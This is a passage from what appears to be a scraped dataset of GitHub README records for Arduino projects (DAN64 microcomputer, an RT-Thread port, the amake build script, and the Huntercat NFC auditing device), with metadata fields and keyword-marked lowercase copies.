keyboard layout only, but is easy to adapt to other layouts.\nStorage:\nAudio in requires quite high volume, start with a 90% and adjust.\nIf you have problems loading DAN64 saved programs, try using a smaller value for R3 (eg. 320 instead of 1K).\nAuthor and licensing\nJuan J. Martinez jjm@usebox.net\nThis software is free software (see LICENSE file for details), unless explicitly stated otherwise.", "link": "https://github.com/reidrac/dan64", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "dan64, an avr based 8-bit microcomputer\nthis is my personal attempt to build a 8-bit microcomputer based on the popular atmega328 microcontroller (mcu) as an excuse to learn some electronics. check docs/ directory for further information.\nthe microcomputer can be assembled and run in a breadboard with an arduino uno board.\ngeneral features:\ncomposite video black and white output, 256 x 192 resolution, 32 x 24 characters (8 x 8 pixels font, code page 437 character set).\nps/2 keyboard support.\n6502 virtual machine with system call interface to native code services.\nlinear 64kb memory access from the virtual machine (256 bytes page zero, 256 bytes hardware stack, 6144 bytes of video ram and 58880 bytes for user programs).\nexternal storage support via audio in/out.\nintegrated 6502 assembler and disassembler.\nbasic shell supporting peek, poke, load, run, etc.\nproject page: http://www.usebox.net/jjm/dan64/\ngeneral directory structure\ndocs/: documentation of the project, including schematics.\nsource code:\ninclude/: general include files.\ninit/: main entry point for the firmware, including the implementation of the syscalls.\nvideo/: composite video generation.\ninput/: ps/2 keyboard support.\nmemory/: memory functions.\nvm/: 6502 virtual machine.\ntest/: virtual machine test suite.\nstorage/: storage using audio in/out.\ntools/: wav audio file encoder.\ndasm/: dan64 assembler/disassembler.\ntools/: standalone version.\ntools/: some misc auxiliary tools (eg, font bitmap generation).\ncc65/: cc65 runtime for cross-compiling c programs.\nexamples/: several user program examples in ca65 assembler and c.\nimages/: logos, pictures, screenshots, etc.\nbuild instructions\ninstall gcc avr compiler and toolchain, and run make in the top level directory.\nif avrdude is installed and you want to deploy to an arduino uno board you can try make upload, although some tweaking may be required (eg, the usb port).\nthe examples and the cc65 runtime require the cc65 compiler. if the binaries are in your path, just use make.\nthe user programs can be encoded into audio using the encode -----> tool !!!  in the storage module (requires posix getopt and libsndfile).\npandoc is required to build the documentation (although it is readable as it is in markdown format).\nnotes\nvideo:\ntiming is set for pal.\noutput is de-interlaced.\nit may require set tv's afc (automatic frequency control) to \"mode2\" (usually for vcrs or camcorders).\ninput:\nsupported uk ps/2 keyboard layout only, but is easy to adapt to other layouts.\nstorage:\naudio in requires quite high volume, start with a 90% and adjust.\nif you have problems loading dan64 saved programs, try using a smaller value for r3 (eg. 320 instead of 1k).\nauthor and licensing\njuan j. martinez jjm@usebox.net\nthis software is free software (see license file for details), unless explicitly stated otherwise.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000945, "year": null}, {"Unnamed: 0": 2991, "autor": 951, "date": null, "content": "Arduino RT-Thread Library\nThis project is forked from RT-Thread (an open source RTOS) and modified for Arduino platform.\nI hope this project will release the power of multitasking on Arduino platform.\nAvailable Drivers\nDriver Dependence Remark\nSPI\nIIC\nSD Card SPI\nILI9341 (LCD) SPI Tested with Adafruit 2.8\" TFT Touch Shield v2\nFT6206 (Touch Screen) IIC Tested with Adafruit 2.8\" TFT Touch Shield v2\nSSD1331 (LCD) SPI Tested with TinyCircuits's Pocket Arcade\nSSD1306 (LCD) SPI Tested with a 0.96\" OLED module\nAvailable Components\nComponent Dependence Remark\nFinSH Serial\nMSH FinSH\nFAT Filesystem ChaN's FatFs\nuLog Serial\nDynamic Module Arduino App\nFinSH (A tiny shell)\nSupport history\nSupport autocompletion\nSupport user defined commands\nSupport user defined variables\nMSH (Module Shell)\nMore in line with Unix shell's usage habits\nSmaller memory footprint\nSupport history\nSupport autocompletion\nSupport user defined commands\nFAT Filesystem\nSupport exFAT (off by default)\nSupport long filename (off by default)\nSupport non-English characters (off by default)\nSupport opening multiple files (4 by default)\nArticle: A Better SD Library with RT-Thread\nuLog (Micro logging system)\nVery useful debug tool\nDynamic Module (Dynamic Shared Library Linker)\nEnabled Arduino App\nArticle: Arduino App with RT-Thread\nSupported Architectures\nArchitecture Core Remark\nSAM ARM Cortex-M3 Tested with Arduino Due\nSAMD ARM Cortex-M0+ Tested with Arduino MKRZero\nGD32V Bumblebee (RV32IMAC) Tested with Longan Nano\nSTM32 ARM Cortex-M7 Tested with Nucleo-F767ZI\nLicense\nComponent License\nRT-Thread core Apache License 2.0\nFatFS FatFs (BSD like) License", "link": "https://github.com/onelife/Arduino_RT-Thread", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino rt-thread library\nthis project is forked from rt-thread (an open source rtos) and modified for arduino platform.\ni hope this project will release the power of multitasking on arduino platform.\navailable drivers\ndriver dependence remark\nspi\niic\nsd card spi\nili9341 (lcd) spi tested with adafruit 2.8\" tft touch shield v2\nft6206 (touch screen) iic tested with adafruit 2.8\" tft touch shield v2\nssd1331 (lcd) spi tested with tinycircuits's pocket arcade\nssd1306 (lcd) spi tested with a 0.96\" oled module\navailable components\ncomponent dependence remark\nfinsh serial\nmsh finsh\nfat filesystem chan's fatfs\nulog serial\ndynamic module arduino app\nfinsh (a tiny shell)\nsupport history\nsupport autocompletion\nsupport user defined commands\nsupport user defined variables\nmsh (module shell)\nmore in line with unix shell's usage habits\nsmaller memory footprint\nsupport history\nsupport autocompletion\nsupport user defined commands\nfat filesystem\nsupport exfat (off by default)\nsupport long filename (off by default)\nsupport non-english characters (off by default)\nsupport opening multiple files (4 by default)\narticle: a better sd library with rt-thread\nulog (micro logging system)\nvery useful debug -----> tool !!! \ndynamic module (dynamic shared library linker)\nenabled arduino app\narticle: arduino app with rt-thread\nsupported architectures\narchitecture core remark\nsam arm cortex-m3 tested with arduino due\nsamd arm cortex-m0+ tested with arduino mkrzero\ngd32v bumblebee (rv32imac) tested with longan nano\nstm32 arm cortex-m7 tested with nucleo-f767zi\nlicense\ncomponent license\nrt-thread core apache license 2.0\nfatfs fatfs (bsd like) license", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000951, "year": null}, {"Unnamed: 0": 3009, "autor": 969, "date": null, "content": "Simple interface to build and Arduino project from the command line in linux\nMotivation\nI love the whole Arduino project idea, but happens that I use Linux OS as may only OS and I hate the lack of modern functions in the provided \"Arduino IDE\".\nSome other users of the Arduino Project faced this (or maybe another) problems and they brought to life the some code projects to make possible to compile his projects without using the default IDE, an example of this is the Ino software; and then when this go deprecated the Arturo software take the lead with a folk into modern waters.\nI has been using both projects since ever, the idea and software are good, but they has different file structures from the Arduino IDE standard, and this bug me a lot: when you share the code with other people that use only the Arduino IDE Software they (99 percernt of the time will be you) must to tweak the files to make it work.\nThen I saw it (a note on the release notes of the Arduino IDE version 1.8.0): now you can build from the command line without the whole IDE apparatus (you don't need a X installed) and this bit me. (Actually it has been on the Arduino IDE since 1.5.x as I can tell, but I don\u2019t know it was THE TOOL I was looking for)\nHaving a way to build the arduino projects with the arduino tools in the command line will help me integrate it to Geany IDE my default IDE and keep the WHOLE compatibility of the project; Wow!\nFirst approach was using directly the arduino-builder tool, that approach worked well with defaults arduino boards, but once you get on other plattforms and compilers... things start to be difficult, so to avoid that I switched completely to use the arduino CLI.\nThis script is a way to make the Arduino IDE CLI even simpler, I will support it as long as it's is useful for me and others, so please let me know if it's a nice tool for you.\nFeatures\nThis is Linux only tool, developed in Ubuntu 16.04 LTS, and must work with other linux with no problem.\nFull arduino integration: same folder structure, same tools, same software.\nYou need only to know 3 things:\nWhat is your board\nWhat file you need to compile\nWhat is the USB port name where the arduino is attached\nBoards and lib support? It will compile all platforms and boards that are installed in your local Arduino Ide environment (using the libs you have installed); for the record you will using the same Arduino IDE tools but with no GUI, nice.\nThis is free software under the GNU GPL version 3.0\nChangelog\nVersion 1.2\nOctober/2018: Fixing for good the serial monitor feature (\"-s\" switch, thanks to @markom via github) It can now auto detect the serial device and the serial speed from any .ino file in the working directory.\nAugust/2018: Adding auto detection of the Arduino IDE installation; it works either if you installed from the repo, downloaded from www.arduino.cc and install it manually or install it using ubuntu-make see the \"Configuration\" section below. (Thanks to Kjell Morgenstern for the initial feature proposition)\nMay/2018: Adding an option to list the auto detected ports for a specific board, and allow to upload to more than one board at a time (Thanks to Don Haig)\nMay/2018: The script can now handle devices (boards) with multiple serial identifiers (like clone leonardo boards before being programmed with Arduino) Thanks to Don Haig for pointing the issue and testing the proposed fix.\nMay/2018: Switch to full arduino CLI support, now we can compile/upload via CLI EVERY board you have supported in your Arduino IDE environment; thanks to Don Haig for asking support for a non native arduino board, that request push me to give some love to this project again.\nSep/2017: Bug fix, arduino files with multiple dots in name (like raduino_v1.22.ino) get mangled and the scripts fails, fixed now via a \"rev\" trick in the shell.\nFeb/2017: Ease the work with multiple .ino files. You need to make a \"amake -c\" and then a compilation against the main arduino file \"amake -v yourfile.ino\", from that point you can compile any .ino file in your editor. (The \"amake -c\" command reset this behavior, so if you renamed the main arduino file, just make a \"clean\" and then compile the main file to set it)\nFeb/2017: Make the IDE version configurable and advice the users to do so, as this do impact in code (and firmware) optimizations, and some more little improvements\nFeb/2017: Auto detection of the serial port; for now just USB-Serial adapters based on the CH340/341 chips.\nConfiguration\nYou need the Arduino IDE software for Linux in a version equal or greater than 1.6.9 (oldest version that I can test), you can get it on the official Arduino Site; the installation is out of the scope of this document, but Google is your friend: \"How to install the Arduino IDE in linux\"\nAs the official doc says, put it or install it on any folder, but always under your $HOME directory.\nAlternatively it you use Ubuntu you can give the ubuntu-make software a try.\nWARNING: From August/2018 the software makes an auto-detection of the Arduino IDE installed, this auto-detection can fail if you have more than one instance (version) of the Arduino IDE; please remove the install directory for older versions to get rid of this issues. You has been warned.\nThen download and extract the code from this project (GREEN button at top-right \"Clone or download\"), now you need to install the software. For that you need to fire a terminal/console/shell and move to the folder you extracted the amake documents; then run the install script, like this:\npavel@laptop:~$ chmod +x install.sh\npavel@laptop:~$ ./install.sh\nInstalling amake script, you will be asked for a password, please give it.\n[sudo] Password for user pavel:\nDone.\npavel@laptop:~$\nNow is time to run & test it, run this in any bash console:\namake\nWarning: The first time you run the script it may run slow as it's working on the auto detection behind scenes.\nIf all goes well you will get the \"usage\" text, read it, then try this to know what boards are supported by aliases:\namake -b\nNow you need to configure your IDE build commands, in Geany you can take note of this three:\nVerify or compile it\ncd %d ; amake -v uno %f\nTake a peek on the Geany help, the %d is swapped by the actual file path and the %f is swapped with the filename at run time.\nThe \"-v\" switch tells the script that you want to verify (aka compile) your sketch to detect errors.\n'uno' is the board alias name (you can get details running 'amake list')\nOnce you successfully compiled it once, amake will take the board and file (the 'uno' and '%f' parameter) as optionals (that info is stored in a local hidden file on your project folder named .amake)\nThis trick will be very useful when you try to compile a multi file project as you can compile against any file in the project, always after compiling it successfully against the main file be aware that 'amake -c' will reset this. This feature is important for people that manages all the code in the command line, once you compile it once successfully you can simply do this:\namake -v\nUpload to a board\ncd %d ; amake -u uno %f /dev/ttyUSB1\nThe \"-u\" switch tells the script that you want to upload your hex code to the board (it will verify it first if needed)\n'uno' is the board alias name (you can get details running 'amake list')\nThe '/dev/ttyUSB1' is the USB port in which the arduino is connected.\nThe serial port parameter can be omitted if you use a Chinese arduino or a cheap USB-Serial adapter, amake will autodetect it. If amake can't detect the port and you don't pass it on the command line it will default to /dev/ttyUSB0.\nThe serial port auto detection also works on some newer boards with an auto detecting USB port routine on uploading, like some samd boards (Adafruit Trinket M0, Arduino Trinket M0, Leonardo and counting up)\nThe \"-u\" switch also uses the trick of caching the board and file details described on the \"-v\" switch, add to this the auto detection of the usb port and you can do just this on the command line:\namake -u\nRemember: always after being successfully compiled it once and be aware that 'amake -c' will reset this.\nClean the environment\nSome times you may need to clean you build environment, this common task if set by a command like this:\ncd %d ; amake -c %f\nThe \"-c\" parameter also unset the feature of caching the board and file; after a \"clean\" you must always compile the project against the main file to gain that feature again.\nEven so, if you had successfully compiled it on the past then you can dismiss the \"%f\" parameter (just once, as a '-c' switch will break that feature)\nMonitor any Serial debug info\ncd %d ; amake -s\nFor this to work properly you will need to make a successful \"amake -v\" after and be on the project/sketch folder. The serial speed is read from the .ino files and some other data is taken from the \".amake\" hidden file that resides on that folder.\nIf in trouble just pass all arguments to it, like this:\ncd %d ; amake -s /dev/ttyUSB0 9600\nThe params are the serial port device file and then the serial speed.\nOther IDEs\nOther IDE tools (vi, atom, eclipse) may need to switch parameters but the ones showed here are very simple as an example and I know you can adapt it to your preferred IDE tool.\nHow it works?\nThis script just invoke the command line interface for the Arduino IDE and do some simplifications, checks and default tricks to make your live easier.\nBasically it can compile and upload ANY board you can compile and upload with the Arduino IDE graphical user interface, even the newlly installed via the Board Manager, or the ones you put in your local hardware directory: if the Arduino IDE see it and work with then you can use it from the command line.\nThe compiler is set with a persistent build path to speed up the compilation upon smaller changes, be aware that in some cases you will need to make an \"amake -c\" to reset (ERASE) the temporal build path and compile the sketch from zero.\nI make some sacrifices in the process of make this easy from the command line, this is a list of them:\nBoard Aliases and real names\nThe Arduino IDE uses a schema for the user friendly names and full qualified board names (fqbn), I have not built automatic support for it, yet, so I introduces what is known as board aliases.\nThe Arduino IDE uses the fqbn of the board and that can be a tricky game, some examples:\n\"arduino:avr:uno\" just for a Arduino/Genuino uno board\n\"adafruit:samd:adafruit_trinket_m0\" for the Adafruit Trinket M0 board\n\"MegaCore:avr:128:BOD=2v7,LTO=Os,clock=16MHz_external\" for a MegaCore ATMega128 board with a 16MHz externaly generated clock.\nYou see the point? that's why I have embedded some aliases and I can update it along the way to make your life easier.\nEven so if there is no alias for a supported board, you can compile a sketch against it, just activate the option in the Arduino IDE for showing debug output on compiling and take a peek on the debug output, look for a -fqbn parameter in the first lines (scroll to the right)\nFor example, you can see an output like this for a Arduino Star Otto (STM23F4) board:\n/home/pavel/Documentos/Software/Arduino/arduino-1.8.5/arduino-builder -dump-prefs -logger=machine -hardware /home/pavel/Documentos/Software/Arduino/arduino-1.8.5/hardware -hardware /home/pavel/.arduino15/packages -hardware /home/pavel/Arduino/hardware -tools /home/pavel/Documentos/Software/Arduino/arduino-1.8.5/tools-builder -tools /home/pavel/Documentos/Software/Arduino/arduino-1.8.5/hardware/tools/avr -tools /home/pavel/.arduino15/packages -built-in-libraries /home/pavel/Documentos/Software/Arduino/arduino-1.8.5/libraries -libraries /home/pavel/Arduino/libraries -fqbn=arduino:stm32f4:star_otto -ide-version=10805 -build-path /tmp/arduino_build_549136 -warnings=none -build-cache /tmp/arduino_cache_19855 -prefs=build.warn_data_percentage=75 -prefs=runtime.tools.arm-none-eabi-gcc.path=/home/pavel/.arduino15/packages/arduino/tools/arm-none-eabi-gcc/4.8.3-2014q1 -prefs=runtime.tools.dfu-util.path=/home/pavel/.arduino15/packages/arduino/tools/dfu-util/0.9.0-arduino1 -prefs=runtime.tools.arduinoSTM32load.path=/home/pavel/.arduino15/packages/arduino/tools/arduinoSTM32load/2.0.0 -verbose /home/pavel/Arduino/Blink/Blink.ino\nIf you look carefully you can detect the string \"-fqbn=arduino:stm32f4:star_otto\" so you can invoke amake just like this for verify/compile an sketch in this particular board:\ncd %d ; amake -v arduino:stm32f4:star_otto %f\nWhy I don't parse all the platform/board data and put it as aliases already? New boards came into the wild every day, it's a endeless task and this is a hobby for me.\nProgrammers\nSo, you have managed to verify (compile) your sketch and it's working, how I can automate the upload process in the command line?\nFire your Arduino IDE instance, configure the blink.ino example code for your particular board (no matter what board, if OEM or third party) and do an upload.\nOnce you have managed to upload it successfully using the default USB or a custom programmer (LPT port, USB to Serial TTL adapter or even a Pickit2) it will work on the command line for amake, just as it does in the Arduino IDE.\nAt least all the classic arduinos work with this method, no matter if with native USB or a USB to TTL adapter, or using a Pickit2 as a ICP programmer.\nThat's because amake will use the cached programming method you used with the Arduino IDE.\nWarning\nI have not any modern board based on samd or stm32 patform, all this ones has a different schemas for the upload, in theory it must work once you make it work in the IDE, if not please rise an issue in the project page at github and I will work it out with your help.\nContributing\nCode hacks, ideas, tips and pull requests are always welcomed and appreciated; also if you can't code there are a few things you can do to contribute:\nSpot a grammar or syntax error on the docs/code and let me know; English is my second one and I'm not proficient yet.\nYou have a board not supported and some spare time (a few minutes)? drop me and email and I will schedule a time to be on-line with you to test some things or simply advice on you to make some test and pass me the results and I will do the rest: the board will be supported ASAP.\nArduino or arduino compatible boards are not easy to get items here also, you can donate some of your - not used boards - and I can put them to work here, also compatible devices and shields are welcomed.\nDonate Internet or Cell air time to me, I live in the Cuba island and the Internet/Cell service is very expensive here; by this way you can help me stay connected.\nSimply donate the cost of a beer/coffee if you like to do so, of course more than one is allowed ;-)\nRemember: No payment of whatsoever is required to use this code: this is Free/Libre Software, nevertheless donations are very welcomed.\nIf you like to contribute in any way please contact the author at pavelmc@gmail.com for instructions on how to do it.\nThanks in advance and enjoy the ride.\n73 de CO7WT, Pavel", "link": "https://github.com/pavelmc/amake", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "simple interface to build and arduino project from the command line in linux\nmotivation\ni love the whole arduino project idea, but happens that i use linux os as may only os and i hate the lack of modern functions in the provided \"arduino ide\".\nsome other users of the arduino project faced this (or maybe another) problems and they brought to life the some code projects to make possible to compile his projects without using the default ide, an example of this is the ino software; and then when this go deprecated the arturo software take the lead with a folk into modern waters.\ni has been using both projects since ever, the idea and software are good, but they has different file structures from the arduino ide standard, and this bug me a lot: when you share the code with other people that use only the arduino ide software they (99 percernt of the time will be you) must to tweak the files to make it work.\nthen i saw it (a note on the release notes of the arduino ide version 1.8.0): now you can build from the command line without the whole ide apparatus (you don't need a x installed) and this bit me. (actually it has been on the arduino ide since 1.5.x as i can tell, but i don\u2019t know it was the -----> tool !!!  i was looking for)\nhaving a way to build the arduino projects with the arduino tools in the command line will help me integrate it to geany ide my default ide and keep the whole compatibility of the project; wow!\nfirst approach was using directly the arduino-builder tool, that approach worked well with defaults arduino boards, but once you get on other plattforms and compilers... things start to be difficult, so to avoid that i switched completely to use the arduino cli.\nthis script is a way to make the arduino ide cli even simpler, i will support it as long as it's is useful for me and others, so please let me know if it's a nice tool for you.\nfeatures\nthis is linux only tool, developed in ubuntu 16.04 lts, and must work with other linux with no problem.\nfull arduino integration: same folder structure, same tools, same software.\nyou need only to know 3 things:\nwhat is your board\nwhat file you need to compile\nwhat is the usb port name where the arduino is attached\nboards and lib support? it will compile all platforms and boards that are installed in your local arduino ide environment (using the libs you have installed); for the record you will using the same arduino ide tools but with no gui, nice.\nthis is free software under the gnu gpl version 3.0\nchangelog\nversion 1.2\noctober/2018: fixing for good the serial monitor feature (\"-s\" switch, thanks to @markom via github) it can now auto detect the serial device and the serial speed from any .ino file in the working directory.\naugust/2018: adding auto detection of the arduino ide installation; it works either if you installed from the repo, downloaded from www.arduino.cc and install it manually or install it using ubuntu-make see the \"configuration\" section below. (thanks to kjell morgenstern for the initial feature proposition)\nmay/2018: adding an option to list the auto detected ports for a specific board, and allow to upload to more than one board at a time (thanks to don haig)\nmay/2018: the script can now handle devices (boards) with multiple serial identifiers (like clone leonardo boards before being programmed with arduino) thanks to don haig for pointing the issue and testing the proposed fix.\nmay/2018: switch to full arduino cli support, now we can compile/upload via cli every board you have supported in your arduino ide environment; thanks to don haig for asking support for a non native arduino board, that request push me to give some love to this project again.\nsep/2017: bug fix, arduino files with multiple dots in name (like raduino_v1.22.ino) get mangled and the scripts fails, fixed now via a \"rev\" trick in the shell.\nfeb/2017: ease the work with multiple .ino files. you need to make a \"amake -c\" and then a compilation against the main arduino file \"amake -v yourfile.ino\", from that point you can compile any .ino file in your editor. (the \"amake -c\" command reset this behavior, so if you renamed the main arduino file, just make a \"clean\" and then compile the main file to set it)\nfeb/2017: make the ide version configurable and advice the users to do so, as this do impact in code (and firmware) optimizations, and some more little improvements\nfeb/2017: auto detection of the serial port; for now just usb-serial adapters based on the ch340/341 chips.\nconfiguration\nyou need the arduino ide software for linux in a version equal or greater than 1.6.9 (oldest version that i can test), you can get it on the official arduino site; the installation is out of the scope of this document, but google is your friend: \"how to install the arduino ide in linux\"\nas the official doc says, put it or install it on any folder, but always under your $home directory.\nalternatively it you use ubuntu you can give the ubuntu-make software a try.\nwarning: from august/2018 the software makes an auto-detection of the arduino ide installed, this auto-detection can fail if you have more than one instance (version) of the arduino ide; please remove the install directory for older versions to get rid of this issues. you has been warned.\nthen download and extract the code from this project (green button at top-right \"clone or download\"), now you need to install the software. for that you need to fire a terminal/console/shell and move to the folder you extracted the amake documents; then run the install script, like this:\npavel@laptop:~$ chmod +x install.sh\npavel@laptop:~$ ./install.sh\ninstalling amake script, you will be asked for a password, please give it.\n[sudo] password for user pavel:\ndone.\npavel@laptop:~$\nnow is time to run & test it, run this in any bash console:\namake\nwarning: the first time you run the script it may run slow as it's working on the auto detection behind scenes.\nif all goes well you will get the \"usage\" text, read it, then try this to know what boards are supported by aliases:\namake -b\nnow you need to configure your ide build commands, in geany you can take note of this three:\nverify or compile it\ncd %d ; amake -v uno %f\ntake a peek on the geany help, the %d is swapped by the actual file path and the %f is swapped with the filename at run time.\nthe \"-v\" switch tells the script that you want to verify (aka compile) your sketch to detect errors.\n'uno' is the board alias name (you can get details running 'amake list')\nonce you successfully compiled it once, amake will take the board and file (the 'uno' and '%f' parameter) as optionals (that info is stored in a local hidden file on your project folder named .amake)\nthis trick will be very useful when you try to compile a multi file project as you can compile against any file in the project, always after compiling it successfully against the main file be aware that 'amake -c' will reset this. this feature is important for people that manages all the code in the command line, once you compile it once successfully you can simply do this:\namake -v\nupload to a board\ncd %d ; amake -u uno %f /dev/ttyusb1\nthe \"-u\" switch tells the script that you want to upload your hex code to the board (it will verify it first if needed)\n'uno' is the board alias name (you can get details running 'amake list')\nthe '/dev/ttyusb1' is the usb port in which the arduino is connected.\nthe serial port parameter can be omitted if you use a chinese arduino or a cheap usb-serial adapter, amake will autodetect it. if amake can't detect the port and you don't pass it on the command line it will default to /dev/ttyusb0.\nthe serial port auto detection also works on some newer boards with an auto detecting usb port routine on uploading, like some samd boards (adafruit trinket m0, arduino trinket m0, leonardo and counting up)\nthe \"-u\" switch also uses the trick of caching the board and file details described on the \"-v\" switch, add to this the auto detection of the usb port and you can do just this on the command line:\namake -u\nremember: always after being successfully compiled it once and be aware that 'amake -c' will reset this.\nclean the environment\nsome times you may need to clean you build environment, this common task if set by a command like this:\ncd %d ; amake -c %f\nthe \"-c\" parameter also unset the feature of caching the board and file; after a \"clean\" you must always compile the project against the main file to gain that feature again.\neven so, if you had successfully compiled it on the past then you can dismiss the \"%f\" parameter (just once, as a '-c' switch will break that feature)\nmonitor any serial debug info\ncd %d ; amake -s\nfor this to work properly you will need to make a successful \"amake -v\" after and be on the project/sketch folder. the serial speed is read from the .ino files and some other data is taken from the \".amake\" hidden file that resides on that folder.\nif in trouble just pass all arguments to it, like this:\ncd %d ; amake -s /dev/ttyusb0 9600\nthe params are the serial port device file and then the serial speed.\nother ides\nother ide tools (vi, atom, eclipse) may need to switch parameters but the ones showed here are very simple as an example and i know you can adapt it to your preferred ide tool.\nhow it works?\nthis script just invoke the command line interface for the arduino ide and do some simplifications, checks and default tricks to make your live easier.\nbasically it can compile and upload any board you can compile and upload with the arduino ide graphical user interface, even the newlly installed via the board manager, or the ones you put in your local hardware directory: if the arduino ide see it and work with then you can use it from the command line.\nthe compiler is set with a persistent build path to speed up the compilation upon smaller changes, be aware that in some cases you will need to make an \"amake -c\" to reset (erase) the temporal build path and compile the sketch from zero.\ni make some sacrifices in the process of make this easy from the command line, this is a list of them:\nboard aliases and real names\nthe arduino ide uses a schema for the user friendly names and full qualified board names (fqbn), i have not built automatic support for it, yet, so i introduces what is known as board aliases.\nthe arduino ide uses the fqbn of the board and that can be a tricky game, some examples:\n\"arduino:avr:uno\" just for a arduino/genuino uno board\n\"adafruit:samd:adafruit_trinket_m0\" for the adafruit trinket m0 board\n\"megacore:avr:128:bod=2v7,lto=os,clock=16mhz_external\" for a megacore atmega128 board with a 16mhz externaly generated clock.\nyou see the point? that's why i have embedded some aliases and i can update it along the way to make your life easier.\neven so if there is no alias for a supported board, you can compile a sketch against it, just activate the option in the arduino ide for showing debug output on compiling and take a peek on the debug output, look for a -fqbn parameter in the first lines (scroll to the right)\nfor example, you can see an output like this for a arduino star otto (stm23f4) board:\n/home/pavel/documentos/software/arduino/arduino-1.8.5/arduino-builder -dump-prefs -logger=machine -hardware /home/pavel/documentos/software/arduino/arduino-1.8.5/hardware -hardware /home/pavel/.arduino15/packages -hardware /home/pavel/arduino/hardware -tools /home/pavel/documentos/software/arduino/arduino-1.8.5/tools-builder -tools /home/pavel/documentos/software/arduino/arduino-1.8.5/hardware/tools/avr -tools /home/pavel/.arduino15/packages -built-in-libraries /home/pavel/documentos/software/arduino/arduino-1.8.5/libraries -libraries /home/pavel/arduino/libraries -fqbn=arduino:stm32f4:star_otto -ide-version=10805 -build-path /tmp/arduino_build_549136 -warnings=none -build-cache /tmp/arduino_cache_19855 -prefs=build.warn_data_percentage=75 -prefs=runtime.tools.arm-none-eabi-gcc.path=/home/pavel/.arduino15/packages/arduino/tools/arm-none-eabi-gcc/4.8.3-2014q1 -prefs=runtime.tools.dfu-util.path=/home/pavel/.arduino15/packages/arduino/tools/dfu-util/0.9.0-arduino1 -prefs=runtime.tools.arduinostm32load.path=/home/pavel/.arduino15/packages/arduino/tools/arduinostm32load/2.0.0 -verbose /home/pavel/arduino/blink/blink.ino\nif you look carefully you can detect the string \"-fqbn=arduino:stm32f4:star_otto\" so you can invoke amake just like this for verify/compile an sketch in this particular board:\ncd %d ; amake -v arduino:stm32f4:star_otto %f\nwhy i don't parse all the platform/board data and put it as aliases already? new boards came into the wild every day, it's a endeless task and this is a hobby for me.\nprogrammers\nso, you have managed to verify (compile) your sketch and it's working, how i can automate the upload process in the command line?\nfire your arduino ide instance, configure the blink.ino example code for your particular board (no matter what board, if oem or third party) and do an upload.\nonce you have managed to upload it successfully using the default usb or a custom programmer (lpt port, usb to serial ttl adapter or even a pickit2) it will work on the command line for amake, just as it does in the arduino ide.\nat least all the classic arduinos work with this method, no matter if with native usb or a usb to ttl adapter, or using a pickit2 as a icp programmer.\nthat's because amake will use the cached programming method you used with the arduino ide.\nwarning\ni have not any modern board based on samd or stm32 patform, all this ones has a different schemas for the upload, in theory it must work once you make it work in the ide, if not please rise an issue in the project page at github and i will work it out with your help.\ncontributing\ncode hacks, ideas, tips and pull requests are always welcomed and appreciated; also if you can't code there are a few things you can do to contribute:\nspot a grammar or syntax error on the docs/code and let me know; english is my second one and i'm not proficient yet.\nyou have a board not supported and some spare time (a few minutes)? drop me and email and i will schedule a time to be on-line with you to test some things or simply advice on you to make some test and pass me the results and i will do the rest: the board will be supported asap.\narduino or arduino compatible boards are not easy to get items here also, you can donate some of your - not used boards - and i can put them to work here, also compatible devices and shields are welcomed.\ndonate internet or cell air time to me, i live in the cuba island and the internet/cell service is very expensive here; by this way you can help me stay connected.\nsimply donate the cost of a beer/coffee if you like to do so, of course more than one is allowed ;-)\nremember: no payment of whatsoever is required to use this code: this is free/libre software, nevertheless donations are very welcomed.\nif you like to contribute in any way please contact the author at pavelmc@gmail.com for instructions on how to do it.\nthanks in advance and enjoy the ride.\n73 de co7wt, pavel", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000969, "year": null}, {"Unnamed: 0": 3024, "autor": 984, "date": null, "content": "Huntercat NFC\nHow does the Hunter Cat NFC work?\nThe Hunter Cat NFC is the latest security tool for contactless (Near Field Communication) used in access control, identification and bank cards. Specially created to identify NFC readers and sniffing tools, with this tool you can audit, read or emulate cards of different types.\nUnderstanding the Hunter Cat NFC and its LEDs\nThe device has a preloaded reader detection firmware that lets the user know when he is near an NFC reader that is trying to read his card.\nReader detection\nDetect hidden readers seeking to read your cards without authorization for cloning\n1.- Turn on Hunter Cat NFC 2.- Wait for the LEDs to turn off 3.-Red LED flashes every 1 second 4.- Approach the reader, the huntercat NFC LEDs should light up indicating if an NFC reader was detected. 5.- If it does not turn on and the LED stays on, it is not near an NFC reader.\nHOW DOES IT WORK?\nHunter Cat NFC can be set to behave either as an NFC reader a tag or to establish a two-way connection with another NFC device.\nNFC USB Dongle features a SAMD21 MCU which works in conjunction with the PN7150. The USB interface is provided by SAMD21 MCU, and the NFC functionality is ensured thanks to PN7150.\nNFC is designed to be intuitive for users. The Communication between two devices is established in the simplest way possible \u2014 by bringing them close to each other. NFC frontend can operate in three distinct modes:\nCard emulation mode \u2014 where HunterCat NFC behaves like a smart card or a tag\nIn this mode, HunterCat NFC emulates a NFC tag. It doesn\u2019t initiate the communication, it only responds to a NFC reader. A typical application of the card emulation mode is how people use NFC in their smartphones to replace several cards, badges or tags at once (using the same phone for RFID access controls, contactless payments and so on). Card emulation mode, however, is not useful just for smartphones, but for any type of portable device.\nRead/Write \u2014 where HunterCat NFC behaves as an NFC Reader/Writer\nHere, Hunter Cat communicates with a passive tag, NFC smart card, or an NFC device operating in card emulation mode. It can read or write to a tag (although reading is a more common use-case because tags will often be write protected). In this mode, the HunterCat NFC generates the RF field, while a tag or card only modulates it.\nPeer-to-peer \u2014 for more complex interactions\nPeer-to-peer mode establishes a two-way communication channel between a pair of NFC-enabled devices. When a user brings two devices close to each other, the two NFC chips establish a P2P connection and exchange data.\nCharacteristics:\nProcesador Cortex M0+\nUSB C 2.0\nNFC Reader, Card and NFC Forum\nArduino compatible\nCircuitPython compatible\nUF2 Bootloader\n3 LEDs status\nOpen Hardware\nBattery\nRF protocols supported\nNFCIP-1, NFCIP-2 protocol\nISO/IEC 14443A, ISO/IEC 14443B PICC, NFC Forum T4T modes via host interface\nNFC Forum T3T via 